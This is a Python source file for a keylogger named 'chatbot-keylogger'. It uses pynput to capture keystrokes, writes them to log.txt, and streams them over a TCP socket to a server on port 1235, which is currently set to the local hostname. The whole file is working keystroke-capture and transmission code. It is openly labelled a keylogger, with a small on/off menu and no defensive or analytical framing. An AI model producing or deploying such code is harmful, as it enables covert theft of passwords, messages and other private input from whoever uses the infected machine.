#/usr/bin/python


import pynput
import sys
import socket
import signal
import threading
import os
from pynput.keyboard import Key,Listener



class KeyLogger():
    def __init__(self):
        self.HEADER_SIZE = 10
        self.keys = list()
        self.count = 0
        self.x  = threading.Thread()
        self.sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.writeBool = False
        self.keyLoggerOn = False
        self.flag = False
        self.connectToServer()


    def connectToServer(self):
        try:
            self.sck.connect((socket.gethostname(),1235))
            print("Connection established!")
        except Exception as e:
            print(e)

    def startChat(self):
        self.x._stop()


    def on_press(self,key):


        if self.keyLoggerOn:
            self.keys.append(key)

            if(str(key).find("space")>0 or str(key).find("enter")>0):
                self.count += 1

            if self.count>=10:
                self.count = 0

                if self.writeBool:
                    self.write_file(self.keys)

                try:
                    totmsg = ""
                    for key in self.keys:
                        msg = str(key).replace("'","")
                        if msg.find("space") >= 0 or msg.find("enter") >= 0:
                            msg = "\n"
                        elif msg.find("Key") >= 0:
                            msg = ""

                        totmsg += msg
                    totmsg = f"{len(totmsg):<{self.HEADER_SIZE}}" + totmsg
                    self.sck.send(bytes(totmsg, "utf-8"))
                except Exception as e:
                    print("An error occurred. Trying to reconnect to server...")
                    print(e)
                    self.connectToServer()
                self.keys.clear()


    def on_release(self,key) :
        if key == Key.esc:
            self.flag = True
            print("Welcome to chatbot-keylogger program.")
            print("=====================================")
            print("1-Press 's' to start.")
            print("2-Press 'S' to stop.")
            print("2-Press 'q' to exit.")
            print("3-Press 'c' to start chatbot.")
        elif self.flag:
            try:
                self.interact(key.char)
                self.flag = False
            except:
                self.flag = False


    def write_file(self,keys):
        with open("log.txt","a") as f:
            for key in self.keys:
                k = str(key).replace("'","")
                if k.find("space") >0 or k.find("enter")>0:
                    f.write("\n")
                elif k.find("Key") == -1:
                    f.write(k)

    def listen(self):
        with Listener(on_press = self.on_press, on_release = self.on_release) as listener:
            listener.join()

    def start(self):
        self.listen()


    def interact(self, inp):
        if inp=='s':
            self.keyLoggerOn = True
            print("Keylogger opened")
        elif  inp=='q':
            os.kill(os.getpid(), signal.SIGINT)
            # For windows
            #sys._exit()
        elif inp=='S':
            self.keyLoggerOn = False
            print("Keylogger closed")
        else:
            "Please enter a correct input."





keylogger = KeyLogger()
keylogger.start()
